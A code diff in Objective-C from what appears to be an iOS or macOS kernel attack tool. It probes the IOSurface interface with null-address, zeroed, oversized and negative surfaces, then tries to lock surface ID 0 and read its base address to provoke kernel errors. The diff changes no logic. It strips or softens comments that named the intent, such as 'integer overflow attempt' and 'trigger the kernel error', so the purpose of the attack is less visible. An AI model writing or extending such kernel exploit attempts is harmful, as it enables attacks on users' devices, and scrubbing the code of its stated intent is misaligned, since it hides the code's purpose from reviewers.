@@ -73,7 +73,6 @@
     // Step 2: Trigger SID: 0x0 error with surface ID 0
     [self log:@"[2] Triggering SID: 0x0 error..."];
     
-    // Try to use surface ID 0 directly (the error we saw in logs)
     uint32_t surface_id = 0;
     
     // Craft properties that might cause buffer: 0x0
@@ -83,7 +82,7 @@
         @"IOSurfaceHeight": @256,
         @"IOSurfaceAllocSize": @65536,
         @"IOSurfacePixelFormat": @1111970369,
-        @"IOSurfaceAddress": @0,  // Null address to trigger buffer: 0x0
+        @"IOSurfaceAddress": @0,
         @"IOSurfaceOffset": @0,
     };
     
@@ -93,7 +92,7 @@
     
     [self log:[NSString stringWithFormat:@"Create with null addr: 0x%x (ID: %u)", kr, surface_id]];
     
-    // Step 3: Try multiple variations to trigger different kernel errors
+    // Step 3: Try multiple variations
     [self log:@"[3] Firing variations..."];
     
     // Variation A: Zero everything
@@ -108,7 +107,7 @@
         NULL, NULL, &sid_a, NULL);
     [self log:[NSString stringWithFormat:@"Zero surface: 0x%x (ID: %u)", kr, sid_a]];
     
-    // Variation B: Huge dimensions (integer overflow attempt)
+    // Variation B: Huge dimensions
     NSDictionary *huge = @{
         @"IOSurfaceWidth": @0x10000,
         @"IOSurfaceHeight": @0x10000,
@@ -132,15 +131,13 @@
         NULL, NULL, &sid_c, NULL);
     [self log:[NSString stringWithFormat:@"Negative surface: 0x%x (ID: %u)", kr, sid_c]];
     
-    // Step 4: Try to use surface ID 0 directly (trigger the kernel error we saw)
+    // Step 4: Attack surface ID 0 directly
     [self log:@"[4] Attacking surface ID 0..."];
     
-    // Try to lock surface ID 0
     uint64_t input0[1] = {0};
     kr = IOConnectCallMethod(conn, 1, input0, 1, NULL, 0, NULL, NULL, NULL, NULL);
     [self log:[NSString stringWithFormat:@"Lock surface 0: 0x%x", kr]];
     
-    // Try to get base address of surface 0
     kr = IOConnectCallMethod(conn, 2, input0, 1, NULL, 0, NULL, NULL, NULL, NULL);
     [self log:[NSString stringWithFormat:@"Get base addr of 0: 0x%x", kr]];
     
@@ -158,7 +155,6 @@
             NULL, NULL, &sid, NULL);
         if (kr == KERN_SUCCESS) {
             [self log:[NSString stringWithFormat:@"Created surface %d: ID %u", i, sid]];
-            // Immediately try to use it
             uint64_t input[1] = {sid};
             IOConnectCallMethod(conn, 1, input, 1, NULL, 0, NULL, NULL, NULL, NULL);
         }
